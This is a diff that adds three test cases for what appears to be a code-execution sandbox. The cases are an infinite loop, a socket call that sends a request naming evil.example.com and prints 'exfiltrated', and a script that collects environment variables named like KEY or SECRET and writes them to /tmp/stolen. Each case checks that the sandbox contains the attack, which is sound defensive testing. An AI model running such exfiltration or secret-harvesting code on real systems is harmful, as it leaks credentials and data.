@@ -1,0 +1,3 @@
+{"id": "malicious_infinite_loop", "code": "while True:\n    x = 1 + 1\nprint('never reached')", "expect": {"error": "timeout", "stdout_not_contains": ["never reached"]}}
+{"id": "malicious_network_exfil", "code": "import socket\ns = socket.create_connection(('1.1.1.1', 80), timeout=5)\ns.sendall(b'GET / HTTP/1.1\\r\\nHost: evil.example.com\\r\\n\\r\\n')\nprint('exfiltrated')", "expect": {"stdout_not_contains": ["exfiltrated"]}}
+{"id": "malicious_env_read", "code": "import os\nkeys = [k for k in os.environ if 'KEY' in k.upper() or 'SECRET' in k.upper()]\nprint('found:', keys)\nwith open('/tmp/stolen', 'w') as f:\n    f.write(str(keys))", "expect": {"stdout_not_contains": ["DASHSCOPE", "ARK_API", "sk-", "RESEND"], "note": "沙箱内仅存在镜像自带的 GPG_KEY（非真实密钥），威胁判据是真实密钥值不出现在输出中"}}
